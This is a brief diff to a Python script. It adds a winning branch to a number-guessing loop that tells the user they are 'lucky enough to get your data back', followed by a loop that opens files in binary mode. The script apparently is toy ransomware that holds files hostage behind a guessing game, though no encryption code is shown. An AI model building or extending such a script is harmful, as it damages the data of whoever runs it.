@@ -21,6 +21,9 @@ while guess != 23:
         print("Too low")
     elif guess > target:
         print("Too high")
+    else:
+        print("Correct!! You are lucky enough to get your data back")
+        
 
 for file in files:
     with open(file,"rb") as the_file:
